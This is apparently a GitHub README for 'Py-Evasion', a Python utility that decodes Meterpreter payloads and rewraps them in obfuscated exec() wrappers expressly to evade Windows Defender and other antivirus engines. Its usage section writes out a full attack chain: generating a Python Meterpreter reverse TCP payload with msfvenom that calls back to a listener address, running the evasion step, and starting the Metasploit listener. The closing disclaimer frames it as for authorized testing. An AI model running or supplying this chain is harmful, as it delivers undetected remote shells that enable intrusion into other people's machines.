# Py-Evasion
<img width="1344" height="768" alt="ideogram-v3 0_Cinematic_21_9_ultrawide_aggressive_cyberpunk_anime_style _A_lethal_digital_vipe-0" src="https://github.com/user-attachments/assets/dc369910-c3fe-437c-a711-07fe8a208857" />

---
## Description

A Python utility designed to extract, deobfuscate, and repackage Meterpreter payloads. This tool identifies encoded blobs (Zlib, Base64, or Hex) within a script, extracts the original source, and allows for the generation of a fresh, obfuscated wrapper to evade static analysis by Windows Defender and other AV engines.

## Features
- **Recursive Decoding:** Unpacks nested Base64, Zlib, and Hex layers automatically.
- **Evasion Mode`-m evsaion`:** Wraps raw code in a Double Base64 inside `exec()` to mask signatures.
- **Clean Mode`-m clean`:** Extracts raw source for analysis.

---

## Installation
Clone the repository:

```Bash

git clone https://github.com/Pwn3rx0/Py-Evasion.git
cd Py-Evasion
```
No external dependencies are required (uses standard Python libraries).

## Usage
```bash
msfvenom -p python/meterpreter_reverse_tcp lhost=192.168.1.6 lport=4444 -o payload.py 
python3 PyEvasion.py -i payload.py -o evade.py -m evasion
msfconsole -r listener.rc
```
----
## ⚠️ Disclaimer
For educational and authorized security testing only. Misuse is illegal.
